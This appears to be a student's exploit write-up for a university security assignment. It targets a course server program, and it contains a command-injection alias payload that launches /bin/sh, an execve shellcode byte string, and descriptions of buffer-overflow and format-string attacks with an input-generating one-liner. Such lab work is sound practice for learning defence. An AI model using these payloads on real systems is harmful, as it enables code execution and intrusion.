1. Command injection:
    Add 'alias abc ls; /bin/sh -c “touch virus.cs527”; date' to sploit.conf
    Running abc creates  a file virus.cs527 in server binary path. 
    Vulnerability: alias commands are not sanitized.
    Any command can be run using the above command injection attack - rm, kill, exit, etc.

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

2,3. Buffer overflow, Command injection using shell code:
    Exploit: We are creating 8 users of username length 150 each. The simultaneous login of all users casues w command to crash.
    Vulnerability: Implementation of w command copies the list of all logged in usernames as strings to the "send" buffer. When w is executed, the buffer holding all these usernames exceeds length limit of 1024. This causes the server to crash. Thus by placing the appropriate return address at the top of the buffer we can hijack the control flow as per our choice.
    We can also corrupt the return address to point to the shellcode of our choice- i.e., place the above shell code at a location within the buffer and point the return address to this location. The above shellcode is tested on mc08 cluster.

4,5,6. Format string attack + buffer overflow + command injection using shell code:
    Exploit: run the string generated by `print '%100d' + 'A'*1004` as a command.
    Vulnerability: 
    Although the entered command has a length of 1024, by giving a format string in the command, the length limit is exceeded. This causes a buffer overflow and the crash at server. As explained above, we can use it to return to any arbitrary location of our choice or to shell command located within the command.
